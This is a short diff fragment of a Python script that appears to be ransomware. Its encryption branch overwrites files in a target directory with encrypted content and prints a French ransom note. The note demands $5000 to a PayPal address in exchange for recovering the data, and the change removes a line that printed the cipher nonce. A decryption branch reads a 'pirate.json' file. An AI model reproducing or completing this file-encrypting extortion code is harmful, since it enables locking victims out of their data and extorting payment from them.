@@ -42,7 +42,6 @@ if (args.operation == 'enc'):
 				encrypted_content = encryption_cipher.encrypt(f.read())
 			with open(file, 'wb') as f:
 				f.write(encrypted_content)
-		print(encryption_cipher.nonce)
 		print("cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données")
 elif (args.operation == 'dec' and os.path.exists(os.path.join(args.directory, "pirate.json"))):
 	with open(os.path.join(args.directory, "pirate.json"), 'r') as f:
